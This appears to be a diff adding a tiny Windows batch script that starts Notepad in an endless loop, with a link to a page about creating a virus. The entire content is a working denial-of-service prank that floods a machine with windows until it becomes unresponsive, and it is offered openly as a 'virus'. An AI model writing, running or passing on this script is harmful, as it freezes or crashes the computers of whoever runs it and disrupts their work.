@@ -1,0 +1,6 @@
+@ECHO off
+:top
+START %SystemRoot%\system32\notepad.exe
+GOTO top
+
+Link - https://techgrinch.com/create-a-virus/
